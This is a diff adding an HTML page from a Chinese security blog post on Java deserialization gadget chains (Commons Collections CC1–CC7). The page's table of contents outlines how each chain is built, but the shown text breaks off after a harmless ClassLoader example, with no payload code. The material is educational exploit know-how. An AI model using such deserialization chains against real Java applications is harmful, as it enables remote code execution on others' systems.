@@ -1,0 +1,840 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="CC链">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CC链">
+<meta property="og:url" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/index.html">
+<meta property="og:site_name" content="xf&#39;s blog">
+<meta property="og:description" content="CC链">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112143559313.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112144618218.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112175738270.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112175951739.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112201224616.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112201520002.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112201647855.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220114000049205.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112202317676.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112202557367.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112203354588.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112203417189.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112203558952.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112203911569.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112210633401.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112210819481.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112222844981.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112222933549.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112223320405.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113141655060.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113142138674.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113143156749.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113144547007.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113145548023.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113151805508.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113172220131.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113172320968.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113172434616.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113172546274.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113173204630.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113202553501.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113202611426.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113205345886.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113210016248.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113224840178.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113230652364.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113230848575.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113230956346.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113231308270.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113232116527.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113231702688.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113232414140.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113232551037.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113232754925.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113234004315.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113234302447.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220114000313897.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220114001503621.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220114163412056.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220114170524936.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220114224129147.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220114224258894.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220114225441417.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220114230959465.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220114233401583.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220114233933212.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220114234050783.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220114234106670.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220115000824023.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220114234322342.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220115001946006.png">
+<meta property="og:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220115004145834.png">
+<meta property="article:published_time" content="2022-01-15T12:58:45.000Z">
+<meta property="article:modified_time" content="2022-01-15T12:59:43.049Z">
+<meta property="article:author" content="xf">
+<meta property="article:tag" content="java反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112143559313.png">
+
+
+<link rel="canonical" href="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/","path":"2022/01/15/web安全/Java反序列化/CC链/","title":"CC链"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>CC链 | xf's blog</title>
+  
+
+  <script src="/js/third-party/analytics/baidu-analytics.js"></script>
+  <script async src="https://hm.baidu.com/hm.js?50383950ce261bfae047ef555de05e48"></script>
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">xf's blog</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1%E3%80%81%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AF%B9%E8%B1%A1"><span class="nav-number">1.</span> <span class="nav-text">1、动态加载对象</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%EF%BC%89%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">1）分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%EF%BC%89ClassLoader%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text">2）ClassLoader利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3%EF%BC%89URLClassLoader%E5%88%A9%E7%94%A8"><span class="nav-number">1.3.</span> <span class="nav-text">3）URLClassLoader利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4%EF%BC%89UnSafe%E5%88%A9%E7%94%A8"><span class="nav-number">1.4.</span> <span class="nav-text">4）UnSafe利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5%EF%BC%89%E6%80%BB%E7%BB%93"><span class="nav-number">1.5.</span> <span class="nav-text">5）总结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2%E3%80%81CC%E9%93%BE"><span class="nav-number">2.</span> <span class="nav-text">2、CC链</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%EF%BC%89%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E%E6%80%9D%E8%B7%AF"><span class="nav-number">2.1.</span> <span class="nav-text">1）反序列漏洞思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%EF%BC%89CC1%E9%93%BE"><span class="nav-number">2.2.</span> <span class="nav-text">2）CC1链</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E6%8E%A5%E5%8F%A3%E5%AE%9E%E7%8E%B0%E7%B1%BB"><span class="nav-number">2.2.1.</span> <span class="nav-text">1、接口实现类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E9%9B%8F%E5%BD%A2"><span class="nav-number">2.2.2.</span> <span class="nav-text">2、雏形</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81%E5%B0%8F%E6%9C%89%E6%89%80%E6%88%90"><span class="nav-number">2.2.3.</span> <span class="nav-text">3、小有所成</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4%E3%80%81%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3"><span class="nav-number">2.2.4.</span> <span class="nav-text">4、问题解决</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5%E3%80%81%E6%88%90%E5%8A%9F%E6%88%90%E9%93%BE"><span class="nav-number">2.2.5.</span> <span class="nav-text">5、成功成链</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3%EF%BC%89%E5%8F%A6%E4%B8%80%E6%9D%A1CC1%E9%93%BE"><span class="nav-number">2.3.</span> <span class="nav-text">3）另一条CC1链</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E5%88%86%E6%9E%90"><span class="nav-number">2.3.1.</span> <span class="nav-text">1、分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E9%93%BE%E6%88%90"><span class="nav-number">2.3.2.</span> <span class="nav-text">2、链成</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81%E6%80%BB%E7%BB%93"><span class="nav-number">2.3.3.</span> <span class="nav-text">3、总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4%EF%BC%89CC6%E9%93%BE"><span class="nav-number">2.4.</span> <span class="nav-text">4）CC6链</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81URL%E9%93%BE"><span class="nav-number">2.4.1.</span> <span class="nav-text">1、URL链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81CC6%E9%93%BE"><span class="nav-number">2.4.2.</span> <span class="nav-text">2、CC6链</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5%EF%BC%89CC3%E9%93%BE"><span class="nav-number">2.5.</span> <span class="nav-text">5）CC3链</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E5%89%8D%E8%A8%80"><span class="nav-number">2.5.1.</span> <span class="nav-text">1、前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E5%89%8D%E5%A5%8F"><span class="nav-number">2.5.2.</span> <span class="nav-text">2、前奏</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81%E9%93%BE%E6%88%90"><span class="nav-number">2.5.3.</span> <span class="nav-text">3、链成</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6%EF%BC%89CC4%E9%93%BE"><span class="nav-number">2.6.</span> <span class="nav-text">6）CC4链</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E9%97%AE%E9%A2%98%E6%8E%92%E6%9F%A5"><span class="nav-number">2.6.1.</span> <span class="nav-text">1、问题排查</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E9%93%BE%E6%88%90-1"><span class="nav-number">2.6.2.</span> <span class="nav-text">2、链成</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7%EF%BC%89CC2%E9%93%BE"><span class="nav-number">2.7.</span> <span class="nav-text">7）CC2链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8%EF%BC%89CC5%E9%93%BE"><span class="nav-number">2.8.</span> <span class="nav-text">8）CC5链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9%EF%BC%89CC7%E9%93%BE"><span class="nav-number">2.9.</span> <span class="nav-text">9）CC7链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10%EF%BC%89%E6%80%BB%E7%BB%93"><span class="nav-number">2.10.</span> <span class="nav-text">10）总结</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="xf"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">xf</p>
+  <div class="site-description" itemprop="description">xf@github.io</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="xf">
+      <meta itemprop="description" content="xf@github.io">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xf's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CC链
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-01-15 20:58:45 / 修改时间：20:59:43" itemprop="dateCreated datePublished" datetime="2022-01-15T20:58:45+08:00">2022-01-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>CC链</p>
+<span id="more"></span>
+<h1 id="1、动态加载对象"><a href="#1、动态加载对象" class="headerlink" title="1、动态加载对象"></a>1、动态加载对象</h1><h2 id="1）分析"><a href="#1）分析" class="headerlink" title="1）分析"></a>1）分析</h2><p>通过ClassLoader类进行加载</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">        ClassLoader loader = ClassLoader.getSystemClassLoader();</span><br><span class="line">        Class&lt;?&gt; loadClass = loader.loadClass(<span class="string">&quot;org.mentat.test.MyT&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyT</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态代码&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
